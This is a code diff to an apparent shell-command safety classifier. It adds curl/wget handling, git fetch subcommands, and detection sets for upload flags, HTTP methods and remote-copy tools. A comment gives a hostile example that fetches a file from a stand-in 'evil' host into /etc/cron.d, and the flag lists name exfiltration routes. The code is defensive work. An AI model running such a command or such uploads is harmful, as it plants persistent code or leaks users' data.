@@ -118,6 +118,13 @@ export const pathAwareCommands = new Set([
   "source", ".",
   "pip", "npm", "yarn", "cargo", "go",
   "uv",
+  // `curl`/`wget` belong here for the D-a fetch half: a fetched file is a
+  // WRITE the bar has to be able to name, or making fetch judgeable would open
+  // `curl -o /etc/cron.d/x https://evil/y` (today that command is stopped only
+  // by the egress bar, so its write target was never minted). URL operands are
+  // never minted as paths (URL_PATTERN screen in analysis/bash-parser.ts), so
+  // this adds no path noise for the destination itself.
+  "curl", "wget",
 ]);
 
 /** Flags on `find` that make it dangerous (excluding -exec which depends on the subcommand). */
@@ -485,7 +492,39 @@ export function gitNetworkSubcommand(words: string[]): string | null {
 }
 
 /** git subcommands that talk to a remote. */
-export const GIT_NETWORK_SUBCOMMANDS = new Set(["push", "fetch", "pull", "clone"]);
+export const GIT_NETWORK_SUBCOMMANDS = new Set(["push", "fetch", "pull", "clone", "ls-remote"]);
+
+/**
+ * The git half of the D-a fetch set: inbound only, nothing local leaves.
+ * `clone` is deliberately NOT here — it lays down a whole tree the floor never
+ * named, so it stays on the absolute side with `push`.
+ */
+export const GIT_FETCH_SUBCOMMANDS = new Set(["fetch", "pull", "ls-remote"]);
+
+/**
+ * curl/wget flags whose operand is data the command SENDS OUT: a request body,
+ * a form, a file upload, a credential, a cookie. Their presence makes the
+ * command an upload (D-a: the exfil half — whether what leaves is secret is not
+ * verifiable from the text, so intent cannot stand in for the user's call).
+ * Short forms may carry the value attached (`-d'x=1'`, `-Tf`), which the caller
+ * matches on the two-character prefix.
+ */
+export const UPLOAD_BODY_FLAGS = new Set([
+  "-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode",
+  "-F", "--form", "--form-string", "-T", "--upload-file",
+  "-b", "--cookie", "-u", "--user", "--proxy-user",
+  "--post-data", "--post-file", // wget
+]);
+
+/** The HTTP method switch: its VALUE decides inbound vs outbound (`-X GET` is a
+ *  fetch, `-X POST`/`PUT`/`PATCH`/`DELETE` mutate remote state — not fetch). */
+export const HTTP_METHOD_FLAGS = new Set(["-X", "--request"]);
+
+/** Copy-to-remote commands. Direction is NOT parsed: an scp/rsync operand can
+ *  be inbound (`scp host:f ./`) or outbound (`scp ./f host:`), and a bug in that
+ *  parse would move an upload into the judged half, so the whole family stays
+ *  on the absolute side (known friction, docs/dspa-intent-floor.md §9). */
+export const UPLOAD_COPY_COMMANDS = new Set(["scp", "sftp", "ftp", "rsync"]);
 
 /** http(s) URL in command text (non-global). The bracket alternative keeps a
  *  bracketed IPv6 host whole (`http://[::1]:9931/x`): the plain class used to
